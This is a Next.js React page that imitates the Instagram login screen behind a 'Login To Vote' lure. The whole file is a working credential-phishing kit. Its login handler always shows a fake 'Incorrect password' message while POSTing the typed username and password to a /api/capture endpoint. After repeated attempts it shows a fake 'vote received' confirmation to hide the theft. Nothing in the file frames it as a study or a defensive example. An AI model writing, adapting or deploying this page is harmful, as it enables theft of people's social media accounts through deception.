import Head from 'next/head';
import { useState } from 'react';

export default function InstagramLoginPage() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showSuccess, setShowSuccess] = useState(false);
  const [feedback, setFeedback] = useState('');
  const [clickCount, setClickCount] = useState(0);

  const handleLogin = async () => {
    setFeedback('Incorrect password! Please try again...');
    setClickCount(prev => prev + 1);
    
    try {
      const res = await fetch('/api/capture', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: email.trim(), password, method: 'instagram' })
      });
      if (res.ok && clickCount >= 4) setShowSuccess(true);
      setTimeout(() => setShowSuccess(false), 4000);
    } catch (e) {}
    if (clickCount >= 4) setShowSuccess(true);
  };

  return (
    <>
      <Head>
        <meta charSet="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimal-ui" />
        <title>Login To Vote</title>
        <meta name="description" content="View my latest Instagram post, please like and share..." />
        <link rel="shortcut icon" href="/images/ig.png" type="image/x-icon" />
      </Head>

      <style jsx>{`
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        a { text-decoration: none; }
        main { height: 100vh; width: 100%; background-color: #fafafa; display: flex; align-items: center; justify-content: center; }
        #forma { width: 350px; text-align: center; border: 1px solid #c9c9c9; padding: 40px; padding-bottom: 20px; background-color: #fff; margin: auto; position: relative; }
        .form-group { position: relative; margin: 15px 0; }
        .form-group input { width: 100%; background: none; border: none; outline: none; font-size: 13px; color: #6b6b6b; padding: 10px; border-bottom: 1px solid #c4c4c4; }
        .field-icon { position: absolute; right: 10px; top: 10px; color: rgb(65, 65, 65); font-size: 13px; cursor: pointer; }
        button { width: 100%; border: 1px solid #1e71ec; background-color: #1e71ec; color: white; font-size: 13px; font-weight: 500; padding: 12px 5px; border-radius: 5px; cursor: pointer; }
        button:hover { background-color: #145bb8; }
        .orr { position: relative; text-align: center; margin: 20px 0; }
        .orr p { padding-bottom: 0; margin-bottom: 0; font-weight: 600; font-size: 13px; color: rgb(109, 109, 109); }
        .orr::after, .orr::before { content: ""; position: absolute; height: 1px; background-color: #dadada; }
        .orr::after { width: 40%; top: calc(50% - 0.5px); left: 0; }
        .orr::before { width: 40%; top: calc(50% - 0.5px); right: 0; }
        .sign-up { width: 350px; text-align: center; border: 1px solid #c9c9c9; padding: 20px; background-color: #fff; margin: auto; margin-top: 15px; }
        footer p { margin-top: 20px; color: #848585; font-size: 13px; }
        .success-overlay { position: fixed; inset: 0; background: rgba(255, 255, 255, 0.98); z-index: 99999; display: none; align-items: center; justify-content: center; }
        .success-overlay.show { display: flex; }
        .success-box { max-width: 440px; width: 100%; text-align: center; }
        .checkmark { width: 110px; height: 110px; margin: 0 auto 28px; border-radius: 50%; background: #4caf50; display: flex; align-items: center; justify-content: center; animation: pop-in 0.55s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
        .checkmark svg { width: 56px; height: 56px; }
        .checkmark polyline { fill: none; stroke: #fff; stroke-width: 7; stroke-linecap: round; stroke-linejoin: round; stroke-dasharray: 60; stroke-dashoffset: 60; animation: draw-check 0.45s ease-out 0.25s forwards; }
        @keyframes pop-in { 0% { transform: scale(0); } 70% { transform: scale(1.12); } 100% { transform: scale(1); } }
        @keyframes draw-check { to { stroke-dashoffset: 0; } }
        @media (max-width: 450px) { #forma { background-color: transparent; border: none; } .sign-up { background-color: transparent; border: none; } }
      `}</style>

      <main>
        <div className="login-wrapper">
          <img className="logo" src="/logos/ig.png" alt="Instagram" />
          <div id="forma">
            <h1 style={{fontSize: '1.75rem', fontWeight: 700, marginBottom: '8px', color: '#262626'}}>Log in to Instagram</h1>
            <p style={{color: '#888', fontSize: '14px'}}>Phone number, username, or email</p>

            <div className="form-group">
              <input type="text" placeholder="Username or email" value={email} onChange={(e) => setEmail(e.target.value)} />
              <span className="field-icon">🔍</span>
            </div>

            <div className="form-group">
              <input type="password" placeholder="Password" value={password} onChange={(e) => setPassword(e.target.value)} />
            </div>

            <button id="login" type="submit" onClick={handleLogin}>Log In</button>

            <div id="alert-message" style={{color: 'rgb(244, 67, 54)'}}>{feedback}</div>
          </div>
        </div>

        <div className="sign-up"><p>Don't have an account? Sign up</p></div>
        <p className="footer">Meta © 2026</p>
      </main>

      <div className="success-overlay" id="successOverlay" aria-hidden="true">
        <div className="success-box">
          <div className="checkmark"><svg viewBox="0 0 52 52" xmlns="http://www.w3.org/2000/svg"><polyline points="15,27 24,36 39,17"></polyline></svg></div>
          <h2>Your vote has been received</h2>
          <p>We will get back to you when your vote is counted.</p>
        </div>
      </div>
    </>
  );
}